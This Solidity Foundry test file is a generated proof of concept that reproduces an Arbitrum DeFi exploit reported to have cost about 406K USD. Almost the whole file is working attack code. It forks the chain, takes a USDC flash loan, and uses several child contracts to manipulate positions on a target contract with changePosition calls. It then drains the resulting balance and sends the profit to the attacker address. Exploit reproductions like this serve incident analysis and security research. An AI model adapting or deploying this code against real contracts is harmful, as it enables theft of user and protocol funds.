// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 406.22K USD
// Attacker : 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95
// Attack Contract : N/A
// Vulnerable Contract : N/A
// Attack Tx : 0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
// Block : 419829771
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 395.15K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    uint256 constant TX_TIMESTAMP = 1768033835;
    uint256 constant TX_BLOCK_NUMBER = 419829771;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        attack = new OurAttack();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_625E77_B4CD, address(0), Addresses.USDC_5CC8, "USDC", 500250000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC_5CC8, "USDC", 394742852305);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        attackChild = new AttackChild();
        require(address(attackChild) == 0x348DF930E825Da25552D8B3dc44e871c67846CB5, "unexpected attack child");
    }

    function attack() public payable {
        attackChild.run();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, 394742852305);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }
}

contract AttackChild {
    constructor() payable {
        _deployAttackChild();
    }

    receive() external payable {}

    function executeOperation(
        address flashLoanToken,
        uint256 borrowedAmount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        flashLoanToken;
        borrowedAmount;
        premium;
        initiator;
        params;
        if (!_callbackDone[CALLBACK_DONE]) _execOp();
        return true;
    }

    function run() external payable {
        _borrowFlashLoan();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function execOp() external payable returns (bool) {
        if (!_callbackDone[CALLBACK_DONE]) _execOp();
        return true;
    }

    bytes32 private constant CALLBACK_DONE = keccak256("poc.callback.done");
    mapping(bytes32 => bool) private _callbackDone;

    function _execOp() internal {
        _callbackDone[CALLBACK_DONE] = true;
        _executeLoanCallback();
    }

    function _executeLoanCallback() internal {
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).updateFunding();
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        uint256 firstPositionSeed = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, firstPositionSeed);
        AttackChild_3(payable(Addresses.attack_child_6635)).openPosition();
        uint256 zeroPoolSeed = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, zeroPoolSeed);
        AttackChild_1(payable(Addresses.attack_child)).zeroPool();
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        uint256 finalPoolSeed = 500000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, finalPoolSeed);
        _callFinalPool();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 primaryAllowance = 496500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, primaryAllowance);
        int256 primaryPositionSize = 496500000000;
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(-68000000000000000000), primaryPositionSize, int256(0));
        AttackChild_3(payable(Addresses.attack_child_6635)).drain();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 repaymentAllowance = 500250000000;
        IERC20Like(Addresses.USDC_5CC8)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, repaymentAllowance);
    }

    function _borrowFlashLoan() internal {
        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
            ).flashLoanSimple(address(this), Addresses.USDC_5CC8, 500000000000, hex"", 0);
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 residualUsdc = 394742852305;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_path_entry, residualUsdc);
    }

    function _callFinalPool() internal {
        AttackChild_2(payable(Addresses.attack_child_7BEB)).readPoolState();
    }

    function _deployAttackChild() public {
        AttackChild_3 attackChild_3 = new AttackChild_3();
        require(address(attackChild_3) == Addresses.attack_child_6635, "unexpected attack child");
        AttackChild_1 attackChild_1 = new AttackChild_1();
        require(address(attackChild_1) == Addresses.attack_child, "unexpected attack child");
        AttackChild_2 attackChild_2 = new AttackChild_2();
        require(address(attackChild_2) == Addresses.attack_child_7BEB, "unexpected attack child");
    }
}

contract AttackChild_1 {
    receive() external payable {}

    function zeroPool() external payable {
        _readPoolState();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _readPoolState() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 zeroPoolAllowance = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, zeroPoolAllowance);
        int256 zeroPoolSize = 2000000000;
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(324678582642240534), zeroPoolSize, int256(0));
    }
}

contract AttackChild_2 {
    receive() external payable {}

    function readPoolState() external payable {
        _readPoolState();
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x7ef540b0) {
            _readPoolState();
            return;
        }
    }

    function flashCallback() external payable {
        _readPoolState();
    }

    function _readPoolState() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 finalPoolAllowance = 500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, finalPoolAllowance);
        int256 finalPoolSize = 500000000;
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(1000000000000000), finalPoolSize, int256(0));
    }
}

contract AttackChild_3 {
    receive() external payable {}

    function openPosition() external payable {
        _readPoolState();
        return;
    }

    function drain() external payable {
        _drainPosition();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _readPoolState() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 openAllowance = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, openAllowance);
        int256 openSize = 1000000000;
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).changePosition(int256(100000000000000000), openSize, int256(0));
    }

    function _drainPosition() internal {
        IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.A_F7CA73_80BC);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).changePosition(int256(0), int256(-894992852305), int256(0));
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 drainedUsdc = 894992852305;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.created_attack_contract_6CB5, drainedUsdc);
    }
}

library Addresses {
    address internal constant attack_path_entry = 0x21EdA2e3ad975Fde9c81769E15Ed8e1532eB08a4;
    address internal constant created_attack_contract_6CB5 = 0x348DF930E825Da25552D8B3dc44e871c67846CB5;
    address internal constant A_625E77_B4CD = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant attack_child = 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f;
    address internal constant attacker_eoa = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;
    address internal constant attack_child_7BEB = 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb;
    address internal constant attack_child_6635 = 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635;
    address internal constant A_F7CA73_80BC = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;
    address internal constant USDC_5CC8 = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
}

interface IContract_F7CA73_80BC {
    function changePosition(int256, int256, int256) external;
    function longPosition() external view;
    function updateFunding() external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
}
